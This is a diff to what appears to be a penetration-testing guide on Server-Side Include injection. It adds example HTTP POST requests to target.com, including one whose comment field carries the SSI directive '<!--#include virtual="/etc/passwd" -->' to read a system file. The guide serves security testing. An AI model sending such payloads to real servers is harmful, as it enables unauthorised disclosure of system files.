@@ -22,7 +22,15 @@ Identify all possible user input points, including ( Cookie , comments,)
 {% endstep %}
 
 {% step %}
-Select an input field that reflects user-supplied data back into the application (error messages, forum posts, profile fields)
+Select an input field that reflects user-supplied data back into the application (error messages, forum posts, profile fields) like
+
+```http
+POST /comment HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+comment=HelloWorld
+```
 {% endstep %}
 
 {% step %}
@@ -30,6 +38,16 @@ Submit a test payload containing an SSI directive, such as
 
 ```php
 <!--#include virtual="/etc/passwd" -->
+```
+
+Injected request
+
+```http
+POST /comment HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+comment=<!--#include virtual="/etc/passwd" -->
 ```
 {% endstep %}
 
